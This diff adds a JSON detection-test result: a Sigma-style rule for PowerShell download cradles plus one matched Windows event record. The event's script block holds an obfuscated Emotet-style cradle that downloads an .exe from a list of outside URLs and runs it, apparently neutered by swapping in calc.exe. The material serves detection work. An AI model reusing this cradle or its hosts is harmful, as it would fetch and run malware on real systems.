@@ -1,0 +1,41 @@
+[{
+  "title": "PowerShell Web Download Cradle Via Script Block Logging",
+  "id": "7344d6a1-f035-4997-9b19-40b13f8fddfd",
+  "description": "Detects PowerShell download cradles in Script Block Logging (EID 4104) that combine a\nnetwork-download primitive (Net.WebClient / DownloadFile / DownloadString / Invoke-WebRequest)\nwith an execution or in-memory follow-on (Invoke-Item, Invoke-Expression/IEX, Start-Process,\nor a TLS SecurityProtocol pin). This is a common first-stage malware pattern (e.g. Emotet\ndownloaders). Sigma string matching is case-insensitive by default, so heavily mixed-case /\nconcatenation-obfuscated variants are matched without enumerating every casing.\n",
+  "sigmafile": "",
+  "sigma": [
+    "SELECT * FROM logs WHERE (Channel='Microsoft-Windows-PowerShell/Operational' OR Channel='PowerShellCore/Operational') AND (EventID=4104 AND ((ScriptBlockText LIKE '%Net.WebClient%' ESCAPE '\\' OR ScriptBlockText LIKE '%.DownloadFile(%' ESCAPE '\\' OR ScriptBlockText LIKE '%.DownloadString(%' ESCAPE '\\' OR ScriptBlockText LIKE '%.DownloadData(%' ESCAPE '\\' OR ScriptBlockText LIKE '%Invoke-WebRequest%' ESCAPE '\\' OR ScriptBlockText LIKE '%Start-BitsTransfer%' ESCAPE '\\') AND (ScriptBlockText LIKE '%Invoke-Item%' ESCAPE '\\' OR ScriptBlockText LIKE '%Invoke-Expression%' ESCAPE '\\' OR ScriptBlockText LIKE '%IEX %' ESCAPE '\\' OR ScriptBlockText LIKE '%IEX(%' ESCAPE '\\' OR ScriptBlockText LIKE '%Start-Process%' ESCAPE '\\' OR ScriptBlockText LIKE '%Net.ServicePointManager%' ESCAPE '\\' OR ScriptBlockText LIKE '%FromBase64String%' ESCAPE '\\')))"
+  ],
+  "rule_level": "high",
+  "tags": [
+    "attack.execution",
+    "attack.t1059.001"
+  ],
+  "count": 1,
+  "matches": [
+    {
+      "row_id": 1,
+      "ActivityID": "CCAD9034-7B61-0001-83CF-ADCC617BD601",
+      "Channel": "Microsoft-Windows-PowerShell/Operational",
+      "Computer": "DESKTOP-RIPCLIP",
+      "EventID": 4104,
+      "EventRecordID": 683,
+      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A",
+      "Keywords": "0x0",
+      "Level": 5,
+      "MessageNumber": 1,
+      "MessageTotal": 1,
+      "Opcode": 15,
+      "OriginalLogfile": "exec_emotet_ps_4104.evtx",
+      "ProcessID": 6620,
+      "Provider_Name": "Microsoft-Windows-PowerShell",
+      "ScriptBlockId": "fdd51159-9602-40cb-839d-c31039ebbc3a",
+      "ScriptBlockText": "$Va5w3n8=(('Q'+'2h')+('w9p'+'1'));&('ne'+'w-'+'item') $eNV:teMP\\WOrd\\2019\\ -itemtype DIrectOry;[Net.ServicePointManager]::\"SecURi`T`ypRO`T`oCOL\" = ('t'+'ls'+'1'+('2, tl'+'s')+'11'+(', '+'tls'));$Depssu0 = (('D'+'yx')+('x'+'ur4g')+'x');$A74_j9r=('T'+'4'+('gf45'+'h'));$Fdkhtf_=$env:temp+(('{0}'+'word{'+'0}'+('2'+'01')+'9{0}') -F [CHAr]92)+$Depssu0+('.'+('ex'+'e'));$O39nj1p=('J6'+'9l'+('hm'+'h'));$Z8i525z=&('new-'+'obje'+'c'+'t') neT.WEbcLiENt;$Iwmfahs=(('h'+'ttp')+(':'+'//')+('q'+'u'+'anticaelectro'+'n'+'ic')+('s.com'+'/')+'w'+'p-'+'a'+('d'+'min')+'/'+'7A'+('Tr78'+'/*'+'htt')+('p'+'s:/')+('/r'+'e')+'be'+('l'+'co')+'m'+'.'+('ch/'+'pi'+'c')+('ture'+'_')+('l'+'ibra'+'ry/bbCt')+('l'+'S/')+('*ht'+'tp'+'s:/')+('/re'+'al')+'e'+'s'+('tate'+'a')+('gen'+'t')+'te'+('am.co'+'m')+'/'+('163/Q'+'T')+'d'+('/'+'*ht'+'tps:')+'//'+('w'+'ww.')+('ri'+'dd')+('hi'+'display.'+'c'+'o')+'m/'+'r'+'id'+'d'+('hi'+'/1pKY/'+'*htt')+'p'+(':'+'//')+('radi'+'osu'+'bmit.com/'+'sear')+('ch_'+'tes'+'t')+'/'+'p'+('/*'+'h')+('ttp'+':/')+'/'+('res'+'e')+'ar'+('ch'+'c')+'he'+'m'+('plu'+'s.'+'c')+('om/w'+'p-')+('a'+'dmin')+'/1'+('OC'+'C')+'/'+('*http:'+'/')+('/s'+'zymo')+('ns'+'zyp')+'er'+('sk'+'i')+('.'+'pl/a')+'ss'+('ets/'+'p')+'k/').\"S`Plit\"([char]42);$Zxnbryr=(('Dp'+'z9')+'4'+'a6');foreach($Mqku5a2 in $Iwmfahs){try{$Z8i525z.\"d`OWN`load`FIlE\"($Mqku5a2, $Fdkhtf_);$Lt8bjj7=('Ln'+('wp'+'ag')+'m');If ((.('Get-I'+'t'+'em') $Fdkhtf_).\"le`NgTH\" -ge 28315) {cp (gcm calc).path $Fdkhtf_ -Force; .('Invo'+'ke'+'-Item')($Fdkhtf_);$Nfgrgu9=(('Qj6'+'bs')+'x'+'n');break;$D7ypgo1=('Bv'+('e'+'bc')+'k0')}}catch{}}$Gmk6zmk=(('Z2x'+'aaj')+'0')",
+      "SystemTime": "2020-08-26T05:09:28.845521Z",
+      "Task": 2,
+      "ThreadID": 6340,
+      "UserID": "S-1-5-21-2895499743-3664716236-3399808827-1001",
+      "Version": 1
+    }
+  ]
+}]
